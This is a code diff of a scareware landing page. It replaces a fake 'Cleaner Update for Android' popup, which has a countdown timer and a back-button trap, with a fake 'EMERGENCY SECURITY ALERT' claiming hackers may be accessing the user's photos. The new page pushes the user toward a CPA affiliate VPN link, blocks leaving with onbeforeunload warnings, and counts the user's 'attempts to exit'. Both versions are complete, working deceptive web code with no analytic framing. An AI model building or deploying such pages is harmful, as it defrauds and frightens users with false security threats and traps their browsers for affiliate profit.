@@ -1,129 +1,179 @@
-
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Cleaner Update Required</title>
-  <style>
-    body {
-      background-color: #f2f2f2;
-      margin: 0;
-      font-family: Arial, sans-serif;
-    }
-    .modal {
-      background-color: white;
-      max-width: 400px;
-      margin: 80px auto;
-      padding: 30px;
-      text-align: center;
-      border: 1px solid #ccc;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.3);
-    }
-    .modal img {
-      width: 50px;
-      margin-bottom: 20px;
-    }
-    .modal h2 {
-      color: #333;
-      margin-bottom: 10px;
-    }
-    .modal p {
-      font-size: 16px;
-      color: #555;
-    }
-    .timer {
-      color: red;
-      font-weight: bold;
-      margin: 15px 0;
-    }
-    .btn-container {
-      margin-top: 20px;
-    }
-    .btn {
-      padding: 12px 20px;
-      font-size: 16px;
-      margin: 5px;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-    .cancel {
-      background-color: #ccc;
-      color: #000;
-    }
-    .update {
-      background-color: #007bff;
-      color: #fff;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Security Alert</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #000;
+            color: white;
+            height: 100vh;
+            overflow: hidden;
+            touch-action: manipulation;
+            position: fixed;
+            width: 100%;
+        }
+        
+        .alert-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+        
+        .alert-box {
+            background: #d10000;
+            color: white;
+            border: 3px solid #ff0000;
+            border-radius: 10px;
+            padding: 25px;
+            max-width: 500px;
+            text-align: center;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.7);
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 10px rgba(255, 0, 0, 0.7); }
+            50% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.9); }
+            100% { box-shadow: 0 0 10px rgba(255, 0, 0, 0.7); }
+        }
+        
+        .alert-logo {
+            width: 80px;
+            margin-bottom: 15px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            margin-bottom: 15px;
+            color: #fff;
+        }
+        
+        .system-alert-text {
+            font-weight: bold;
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        
+        .checkbox-warning {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            text-align: left;
+            padding-left: 10px;
+        }
+        
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        .btn {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .btn-install {
+            background: #00a800;
+            color: white;
+        }
+        
+        .btn-install:hover {
+            background: #008000;
+        }
+        
+        .btn-cancel {
+            background: #333;
+            color: white;
+        }
+        
+        .btn-cancel:hover {
+            background: #555;
+        }
+        
+        .exit-attempts {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #ff9999;
+        }
+    </style>
 </head>
 <body>
-  <div class="modal">
-    <img src="https://cdn-icons-png.flaticon.com/512/565/565547.png" alt="Cleaner Icon">
-    <h2>Cleaner Update for Android is Recommended!</h2>
-    <p>Your phone can work faster. We released a Cleaner update, and it is recommended for every phone.<br><br>
-    If you do not upgrade, your smartphone might be slowed down and your battery may discharge quickly.<br><br>
-    Update now for <strong>FREE</strong> to clean and boost your Android immediately!</p>
-    <div class="timer" id="countdown">5 minutes 00 seconds</div>
-    <div class="btn-container">
-      <button class="btn cancel" onclick="cancelAction()">CANCEL</button>
-      <button class="btn update" onclick="updateNow()">UPDATE NOW</button>
+    <div class="alert-container" id="alertContainer">
+        <div class="alert-box">
+            <img src="https://cdn-icons-png.flaticon.com/512/753/753345.png" class="alert-logo" alt="Warning">
+            <h1>EMERGENCY SECURITY ALERT</h1>
+            
+            <div class="system-alert-text">system alert</div>
+            
+            <div class="checkbox-warning">
+                <input type="checkbox" id="warningCheck" disabled checked>
+                <label for="warningCheck">Hackers may be accessing your photos!</label>
+            </div>
+            
+            <div class="button-group">
+                <button class="btn btn-install" onclick="window.location.href='YOUR_CPA_LINK'">
+                    INSTALL VPN PROTECTION NOW
+                </button>
+                <button class="btn btn-cancel" id="cancelBtn">
+                    CANCEL (RISKY)
+                </button>
+            </div>
+            
+            <div class="exit-attempts" id="exitAttempts">
+                Warning: 1/7 attempts to exit
+            </div>
+        </div>
     </div>
-  </div>
 
-  <script>
-    const offerLink = "https://www.smallvalue.guru/click?offer_id=29716&pub_id=269631&pub_click_id=VPN_ANDROID&site=ANDROID_LANDER";
+    <script>
+        let attempts = 1;
+        const maxAttempts = 7;
+        const cancelBtn = document.getElementById('cancelBtn');
+        const exitAttemptsText = document.getElementById('exitAttempts');
+        
+        // Warn user when trying to leave
+        window.onbeforeunload = function(e) {
+            if (attempts < maxAttempts) {
+                e.preventDefault();
+                e.returnValue = `⚠️ WARNING (${attempts}/${maxAttempts}): Leaving may expose you to hackers!`;
+                return e.returnValue;
+            }
+        };
 
-    function updateNow() {
-      window.location.href = offerLink;
-    }
-
-    function cancelAction() {
-      alert("Cleaner update strongly recommended for Android performance.");
-    }
-
-    // STRONG back button trap
-    function blockBack() {
-      // Push multiple history entries
-      history.pushState(null, "", location.href);
-      history.pushState(null, "", location.href);
-
-      window.addEventListener("popstate", function () {
-        alert("⚠️ Please update now to boost your phone speed!");
-        history.pushState(null, "", location.href);
-      });
-
-      // Re-push periodically
-      setInterval(() => {
-        history.pushState(null, "", location.href);
-      }, 2000);
-    }
-
-    // Execute immediately
-    blockBack();
-
-    // Countdown logic
-    let minutes = 5;
-    let seconds = 0;
-    const timerDisplay = document.getElementById("countdown");
-
-    const timer = setInterval(() => {
-      if (seconds === 0) {
-        if (minutes === 0) {
-          clearInterval(timer);
-          timerDisplay.innerText = "Time expired. Redirecting...";
-          updateNow();
-          return;
-        }
-        minutes--;
-        seconds = 59;
-      } else {
-        seconds--;
-      }
-      timerDisplay.innerText = \`\${minutes} minute\${minutes !== 1 ? 's' : ''} \${seconds} second\${seconds !== 1 ? 's' : ''}\`;
-    }, 1000);
-  </script>
+        // "Cancel" button also triggers warning
+        cancelBtn.addEventListener('click', function() {
+            attempts++;
+            exitAttemptsText.textContent = `Warning: ${attempts}/${maxAttempts} attempts to exit`;
+            
+            if (attempts < maxAttempts) {
+                alert(`⚠️ WARNING (${attempts}/${maxAttempts}): You are at risk!`);
+            } else {
+                window.location.href = "about:blank";
+            }
+        });
+    </script>
 </body>
 </html>
